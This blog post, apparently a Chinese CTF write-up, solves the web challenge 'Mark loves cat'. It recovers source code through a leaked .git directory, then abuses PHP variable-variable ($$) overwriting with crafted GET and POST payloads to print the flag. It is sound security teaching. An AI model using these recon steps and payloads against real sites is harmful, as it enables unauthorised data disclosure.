---
title: BJDCTF2020Mark loves cat
date: 2022-07-02 22:23:00
tags:
- web
categories:
- [刷题, web题集]
---

打开后发现是一个网页，这时候想到可能是某些文件泄露（常见的什么www文件或者git文件泄露），所以使用dirsearch扫描发现是git文件泄露，所以可以使用工具githack将泄露的git文件进行获取

**由于是题目复现所以在做题过程中并未找到文件，参考了其他师傅们的文件特此说明**

将获得的两个关键文件打开index.php和flag.php

![image-20220702115819334](/image-20220702115819334.png)

开始审计index.php

我们知道flag被包含在其中了所以只要想办法将其输出就好（**变量的覆盖利用**）

``` php
include 'flag.php';
$yds = "dog";
$is = "cat";
$handsome = 'yds';

foreach($_POST as $x => $y){
    $$x = $y;
}

foreach($_GET as $x => $y){
    $$x = $$y;	
}

foreach($_GET as $x => $y){
    if($_GET['flag'] === $x && $x !== 'flag'){	//GET方式传flag只能传一个flag=flag
        exit($handsome);
    }
}

if(!isset($_GET['flag']) && !isset($_POST['flag'])){	//GET和POST其中之一必须传flag
    exit($yds);
}

if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){	//GET和POST传flag,必须不能是flag=flag
    exit($is);
}

echo "the flag is：".$flag;

```

## 关于代码中的几个函数解释

exit（）：函数输出一条消息，并退出当前脚本。**也是本题的利用点**

isset（）：函数用于检测变量是否已设置并且非 NULL。

## 利用详情及原理

### 1、exit（$handsomne）

关键代码部分：

``` php
foreach($_GET as $x => $y){
    $$x = $$y;	
}

foreach($_GET as $x => $y){
    if($_GET['flag'] === $x && $x !== 'flag'){	//GET方式传flag只能传一个flag=flag
        exit($handsome);//输出的地方最终将flag从此处输出
    }
}
```

第一个foreach因为使用了"$$"存在变量覆盖漏洞因此可以将flag值传递给handsome

即$handsome=$flag

所以要传入handsome=flag

第二个foreach要让输入的flag值强类型等于$x并且$x的值不等于flag

所以我们可以输入a=flag&flag=a

这样$x=a且flag传入的值也是a既可以绕过if判断将flag输出；

payload：

？handsome=flag&a=flag&flag=a

？handsome=flag&flag=handsome

![image-20220702154016839](/image-20220702154016839.png)

### 2、exit($yds)

利用核心代码：

```php
foreach($_POST as $x => $y){
    $$x = $y;
}

if(!isset($_GET['flag']) && !isset($_POST['flag'])){	//GET和POST其中之一必须传flag
    exit($yds);
}
```

基于对get传参的理解（变量覆盖漏洞）

第二个判断我们仅需通过传入get方式传入yds=flag即可将flag值赋在yds上并且输出：

payload：

yds=flag

![image-20220702154203645](/image-20220702154203645.png)



### 4、exit($is)

```php
if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){	//GET和POST传flag,必须不能是flag=flag
    exit($is);
}
```

原理与之前的类似所以直接给payload了

payload：is=flag&flag=flag

![image-20220702163133258](/image-20220702163133258.png)



### 5、echo "the flag is：".$flag

我们看到在最后一段有这么一条语句，如果前面我们不将flag值进行改边那可以直接进行flag的输出

```php
echo "the flag is：".$flag;
```

回想之前的代码在所有代码中的判断过程都是需要进行强类型判断所以当输入1时在解析过程中一个为字符型一个为整型所以就会跳过所有的if判断直到执行输出flag；

payload：

1=flag&flag=1

![image-20220702162319293](/image-20220702162319293.png)

## Get新知识

当php语法中存在"$$x=$$y"的情况下可能会存在变量覆盖漏洞所以只要通过合理的构造我们就可以从中获取flag；

经常导致变量覆盖漏洞场景有：**$$** 使用不当，**extract()** 函数使用不当，**parse_str()** 函数使用不当，**import_request_variables()** 使用不当，开启了[全局变量](https://so.csdn.net/so/search?q=全局变量&spm=1001.2101.3001.7020)注册等。

特别鸣谢：

[[BJDCTF2020\]Mark loves cat | 四种解法 (新解法：强类型比较绕过) - Nestar - 博客园 (cnblogs.com)](https://www.cnblogs.com/sanqiushu/p/15922456.html)

[(19条消息) 变量覆盖漏洞总结_WHOAMIAnony的博客-CSDN博客_变量覆盖漏洞](https://blog.csdn.net/qq_45521281/article/details/105849770)

